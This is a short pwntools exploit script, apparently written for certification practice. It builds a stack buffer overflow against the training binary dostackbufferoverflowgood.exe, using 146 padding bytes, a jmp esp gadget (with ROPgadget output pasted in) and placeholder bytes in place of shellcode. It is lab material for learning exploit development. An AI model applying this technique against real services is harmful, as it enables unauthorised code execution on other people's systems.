#!/usr/bin/env python3
from pwn import *
r = remote('192.168.0.9',31337)

# use ropgadget to find a jmp esp somewhere
"""
pat@kali:~/Desktop/Cert_Prep/doBOG/python_scripts$ ROPgadget --binary ~/Desktop/dostackbufferoverflowgood.exe | grep "jmp esp"
0x080414be : adc eax, 0xb8000002 ; jmp esp
0x080414c3 : jmp esp
0x080414bb : ror byte ptr [edi], cl ; test byte ptr [0xb8000002], dl ; jmp esp
0x080414bd : test byte ptr [0xb8000002], dl ; jmp esp
"""
jmp_esp_gadget = struct.pack("<I",0x080414c3)
buf = b""
buf+= b"A"*146
buf+= jmp_esp_gadget
buf+= b"BBBBCCCCDDDDEEEE"
buf+= b"\n"
r.send(buf)
resp = r.recv()
print(str(resp))

# uses the jmp esp gadget to jump to that stack pointer that's now pointing to my input.
# I didn't actually overwrite the stack pointer
